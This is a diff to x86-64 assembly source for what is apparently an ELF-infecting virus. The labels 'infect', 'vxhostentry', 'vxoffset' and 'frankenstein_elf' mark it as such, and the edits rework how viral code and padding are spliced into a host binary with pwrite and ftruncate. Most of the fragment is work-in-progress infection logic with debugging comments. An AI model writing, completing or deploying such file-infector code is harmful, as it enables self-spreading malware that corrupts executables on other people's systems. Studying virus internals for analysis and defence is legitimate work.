@@ -300,8 +300,9 @@ hosttext_start: dd 0
 
 data_offset_new_padding: dd 0
 data_offset_original: dd 0
+data_offset_padding_size: dd 0
 
-padding2data_segment equ	data_offset_new_padding-data_offset_original
+;padding2data_segment equ	data_offset_new_padding-data_offset_original
 
 vxhostentry: dq 0
 vxoffset: dd 0
@@ -784,6 +785,8 @@ infect:
 					mov dword [data_offset_original],  r11d
 					add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
 					mov dword [data_offset_new_padding],  r11d
+					;sub r11d, dword [data_offset_original]
+					;mov [data_offset_padding_size], r11d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 			.mod_subsequent_phdr:
 				mov rdx, checkptloadfaillen
@@ -975,16 +978,17 @@ frankenstein_elf:
 		mov r10, [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
-	
+
+		mov rsi, rax	
 	;ftruncate syscall will grow the size of file (corresponding to file descriptor fd)
 	; by n bytes, where n is a signed integer, passed in rsi
 	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
 	;before we write the original host data segment to the temp file
 	.write_padding_after_vx:
 		;mov rdx, [padding2data_segment] 
-		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
-		mov rsi, [data_offset_new_padding]
-		sub rsi, [data_offset_original]
+;		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
+		add esi, dword [data_offset_new_padding]
+		;sub rsi, data_offset_original
 		mov rax, SYS_FTRUNCATE
 		syscall
 		
